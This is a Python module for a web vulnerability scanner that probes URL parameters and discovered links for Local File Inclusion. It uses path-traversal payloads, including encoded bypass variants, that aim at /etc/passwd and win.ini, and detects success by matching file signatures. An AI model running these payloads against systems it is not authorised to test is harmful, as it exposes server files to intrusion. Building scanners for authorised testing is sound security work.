import requests
from modules.base_scanner import VulnerabilityScanner
from utils.colors import print_info, print_error, Colors
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from bs4 import BeautifulSoup

class LFIScanner(VulnerabilityScanner):
    def __init__(self, target_url, session):
        super().__init__(target_url, session)
        self.payloads = [
            "../../../../etc/passwd",
            "../../../../windows/win.ini",
            "/etc/passwd",
            "C:\\Windows\\win.ini",
            "....//....//....//etc/passwd",
            "..%2f..%2f..%2f..%2fetc%2fpasswd",
            "....%2f....%2f....%2fetc%2fpasswd",
        ]
        self.signatures = [
            "root:x:0:0",
            "[extensions]",
            "for 16-bit app support",
            "<?php",
            "daemon:x:",
            "bin:x:",
        ]
        # Common parameter names that might be vulnerable to LFI
        self.lfi_params = ["file", "page", "doc", "document", "path", "include", 
                          "template", "view", "content", "load", "read", "url", "filename"]

    def scan(self):
        print_info(f"Starting LFI Scan...")
        
        # Method 1: Test URL parameters directly
        self._scan_url_params()
        
        # Method 2: Discover links with file-like parameters on the page
        self._scan_page_links()
        
        return self.vulnerabilities

    def _scan_url_params(self):
        """Test parameters already in the URL."""
        parsed = urlparse(self.target_url)
        params = parse_qs(parsed.query)
        
        if not params:
            return

        for param_name in params:
            for payload in self.payloads:
                test_params = params.copy()
                test_params[param_name] = payload
                new_query = urlencode(test_params, doseq=True)
                target_url = urlunparse(parsed._replace(query=new_query))
                
                if self._test_lfi(target_url, param_name, payload):
                    return  # Found, stop

    def _scan_page_links(self):
        """Discover links on the page that have file-like parameters and test them."""
        try:
            response = self.session.get(self.target_url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            tested_urls = set()
            
            # Find all links
            for link in soup.find_all('a'):
                href = link.get('href', '')
                if not href:
                    continue
                    
                # Build absolute URL
                from urllib.parse import urljoin
                full_url = urljoin(self.target_url, href)
                parsed = urlparse(full_url)
                params = parse_qs(parsed.query)
                
                # Check if any parameter name looks like a file parameter
                for param_name in params:
                    if param_name.lower() in self.lfi_params:
                        # Found a potential LFI target!
                        url_key = f"{parsed.path}:{param_name}"
                        if url_key in tested_urls:
                            continue
                        tested_urls.add(url_key)
                        
                        print_info(f"Testing LFI on parameter '{param_name}' at {parsed.path}")
                        
                        for payload in self.payloads:
                            test_params = params.copy()
                            test_params[param_name] = payload
                            new_query = urlencode(test_params, doseq=True)
                            target_url = urlunparse(parsed._replace(query=new_query))
                            
                            if self._test_lfi(target_url, param_name, payload):
                                return  # Found, stop for this page
                                
        except Exception:
            pass

    def _test_lfi(self, target_url, param_name, payload):
        """Test a single URL for LFI and return True if found."""
        try:
            response = self.session.get(target_url, timeout=5)
            
            for sig in self.signatures:
                if sig in response.text:
                    print_error(f"LFI Found! Parameter '{param_name}' at {target_url}")
                    self.add_finding(
                        "Local File Inclusion (LFI)",
                        f"LFI payload '{payload}' in parameter '{param_name}' revealed server file content matching signature '{sig}'.",
                        "Critical",
                        url=target_url,
                        payload=payload,
                        evidence=f"Response contains: {sig}",
                        poc=target_url
                    )
                    return True
        except requests.RequestException:
            pass
        return False
